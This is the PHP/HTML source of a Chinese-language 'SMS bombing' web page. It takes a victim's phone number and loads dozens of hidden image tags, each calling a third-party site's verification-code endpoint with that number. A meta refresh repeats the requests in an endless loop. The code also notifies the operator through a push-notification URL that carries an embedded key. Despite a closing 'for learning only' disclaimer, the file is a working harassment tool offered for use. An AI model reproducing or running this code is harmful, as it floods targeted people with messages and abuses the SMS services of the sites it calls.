<!DOCTYPE html PUBLIC "-//WAPFORUM//DTD XHTML Mobile 1.0//EN" "http://www.wapforum.org/DTD/xhtml-mobile10.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html;charset=UTF-8"/>
<meta http-equiv="Cache-Control" content="max-age=0" forua="true"/>
<meta http-equiv="Cache-Control" content="no-cache"/>
<meta http-equiv="Expires" content="0"/>
<title>폭격 콘 솔 | 거짓말</title>
<link href="css.css" rel="stylesheet" media="screen">
<link rel="stylesheet" href="./style.min.css?ver=2.4.2">
<style>
*{font-family:'Microsoft Yahei';}
.bs-callout{margin:20px 0;padding:15px 30px 15px 15px;border-left:5px solid #eee;}.bs-callout-danger{background-color:#fcf2f2;border-color:#dFb5b4;}.bs-callout-warning{background-color:#fefbed;border-color:#f1e7bc;}.bs-callout-info{background-color:#f0f7fd;border-color:#d0e3f0;}.bs-callout-success{background-color:#f4f9ef;border-color:#d6e9c6;}
h4 {font-weight: bold;}
.url {size: 26px;}
.url {color: #FF0000;}
.h {color: #FF0000;}
</style>
<script src="smstest.js"></script>
</head>
<body>
<div class="container">
<div class="panel panel-success">
    <div class="panel-heading">
        <h3 class="panel-title">폭격 콘 솔</h3>
    </div>
    <div class="input-group">
        <span class="input-group-addon input-lg">轰炸</span>
		<form method="GET" action="index.php">
        <input type="text" name="hm" maxlength="11" class="form-control input-lg" placeholder="输入需要轰炸的手机号" value="" />
    </div>
		<div id="pre_request"><br />
        <button type="submit" class="btn btn-danger" name="ok" onclick="ajaxRequest(0);">启动轰炸线程</button>
		<button type="button" class="btn btn-success" onclick="top.location='index.php'">停止轰炸线程</button>
		<button type="button" class="btn btn-info" onclick="top.location='d.php'">多号码模式</button>
		</div>
		</form>

<?php
error_reporting(0);
$v=$_GET['c'];
$a=$v+1;
$e=$a-1;
$tel=$_GET['hm'];
?>
<?php
if($tel>1){
	$url = 'https://sc.ftqq.com/SCU32575Ta9c8604fb8e585c46c9c5cc9c7ba7a075ba35983313ba.send?text=又有人调用你的接口啦~'+$tel;
 file_get_contents($url);
}
?>
<?php
if($tel>1){
	echo "<br /><div class='progress progress-striped active'>
            <div class='progress-bar progress-bar-success' style='width: 100%'>轰炸进行中</div>
        </div>";
	echo "<div id='ajax_thread_msg'><div class='alert alert-success' style='margin-bottom: 0px;'>
轰炸线程已启动！ 轰<strong>$tel</strong> , 第 <strong>$a</strong> 波攻击。<a href='#faq' target='_blank'><i></i></a>
</div>
</div>";
    echo "<div style='display:none'>
<img src='http://xinweixin.11183.com.cn/youzheng/login/security?phone=$tel' alt=''/>
<img src='http://www.zhufuc.com/third/api/sns/sendCodeSns?phone=$tel&verifycode=4465&type=1' alt=''/>
<img src='http://61.232.7.24/cwbase/yhgl/page/RegisterService.ashx?action=GetCode&number=$tel&user=' alt=''/>
<img src='http://www.xxwolo.com/users/sendMessage?phone=$tel&bOK=true'alt=''/>
<img src='http://www.xqbwz.com/index.asp?type=sendSms_new&phone=$tel' alt=''/>
<img src='http://passport2.chaoxing.com/num/phonecode?phone=$tel&needcode=false' alt=''/>
<img src='http://reg.6299.cc/reghelp.aspx?doS=getphonecode&_m=0.648860571187289&jsoncallback=jQuery32103417702422689597_1566449212703&phonenum=$tel&username=evzjwl17&itype=2' alt=''/>
<img src='http://dy.soupunet.com/pages/SendSms.aspx?mobile=$tel' alt=''/>
<img src='https://www.wozhuan.com/Member/Verify/regsend&captcha=nnpx&phone=$tel' alt=''/>
<img src='https://www.0735.com/include/ajax.php?service=siteConfig&action=getPhoneVerify&phone=$tel&vcode=&vericode=&email=&account=&nickname=&password=&phone=$tel&type=signup&callback=jsonp1' alt=''/>
<img src='https://m.iask.sina.com.cn/cas-api/sendSms?terminal=M&businessSys=ishare&nationCode=86&mobile=$tel&businessCode=4&' alt=''/>
<img src='http://www.threemkxgo.com/api/v2/sms/request?app=hulu&device=web&cmd=register&phone=$tel&channel=sm001' alt=''/>
<img src='https://cqwz.cqnews.net/admin/getCaptcha?phone=$tel&type=0' alt=''/>
<img src='http://www.csti.cn/uums-user-front/api/user/register/phone/send?phone=$tel' alt=''/>
<img src='https://www.17ditu.com/user/verification_code/send.html?username=$tel' alt=''/>
<img src='http://m.jiameng.com/sendRegCode.html?mobilePhone=$tel' alt=''/>
<img src='http://mobile.ind4.net/wap/member/sendRegSms.do?t=1566557536580&phoneNumber=$tel' alt=''/>
<img src='http://query.cic.cn/admin/sendMessage?phone=$tel' alt=''/>
<img src='http://lkapi.chelun.com/agt/login/sendCode?mobile=$tel' alt=''/>
<img src='https://passport.lagou.com/register/getPhoneVerificationCode.json?countryCode=0086&phone=$tel&type=0&request_form_verifyCode=&challenge=c80b25d7f33a441133f0910204d96d18&_=1566671473615' alt=''/>
<img src='http://m.zyue.com/userinfo/SendSms?_=1566671284851&mobile=$tel&type=1' alt=''/>
<img src='http://m.jiameng.com/sendRegCode.html?mobilePhone=$tel' alt=''/>
<img src='http://mobile.ind4.net/wap/member/sendRegSms.do?t=1566557536580&phoneNumber=$tel' alt=''/>
<img src='http://soupunet.com/pages/SendSms.aspx?mobile=$tel' alt=''/>
<img src='http://bj.soupunet.com/pages/SendSms.aspx?mobile=$tel' alt=''/>
<img src='http://xy.soupunet.com/pages/SendSms.aspx?mobile=$tel' alt=''/>
<img src='http://dz.soupunet.com/pages/SendSms.aspx?mobile=$tel' alt=''/>
<img src='http://hz.soupunet.com/pages/SendSms.aspx?mobile=$tel' alt=''/>
<img src='http://ak.soupunet.com/pages/SendSms.aspx?mobile=$tel' alt=''/>
<img src='http://wn.soupunet.com/pages/SendSms.aspx?mobile=$tel' alt=''/>
<img src='http://bz.soupunet.com/pages/SendSms.aspx?mobile=$tel' alt=''/>
<img src='http://dy.soupunet.com/pages/SendSms.aspx?mobile=$tel' alt=''/>
<img src='http://ts.soupunet.com/pages/SendSms.aspx?mobile=$tel' alt=''/>
<img src='http://yc.soupunet.com/pages/SendSms.aspx?mobile=$tel' alt=''/>
<img src='http://hz.soupunet.com/pages/SendSms.aspx?mobile=$tel' alt=''/>
<img src='http://nc.soupunet.com/pages/SendSms.aspx?mobile=$tel' alt=''/>
<img src='http://sn.soupunet.com/pages/SendSms.aspx?mobile=$tel' alt=''/>
<img src='http://yl.soupunet.com/pages/SendSms.aspx?mobile=$tel' alt=''/>
<img src='http://gy.soupunet.com/pages/SendSms.aspx?mobile=$tel' alt=''/>
<img src='http://zigong.soupunet.com/pages/SendSms.aspx?mobile=$tel' alt=''/>
<img src='http://neijiang.soupunet.com/pages/SendSms.aspx?mobile=$tel' alt=''/>
<img src='http://ziyang.soupunet.com/pages/SendSms.aspx?mobile=$tel' alt=''/>
<img src='http://yanan.soupunet.com/pages/SendSms.aspx?mobile=$tel' alt=''/>
</div>
	";
     echo"<meta http-equiv=refresh content='0; url=index.php?hm=$tel&amp;c=$a'>";
}else{
}
?>

<div class="bs-callout bs-callout-danger">
    <h4>使用方法：</h4>
    <p>请输入对方手机号进行轰炸。
<p>在提交手机号后，不要关闭本网页，系统会自动轰炸！ </p>
<p>本程序只用于学习,交流。</p>

<p class="h">请不要用于非法!-!</p>
   
</div>
</body>
</html>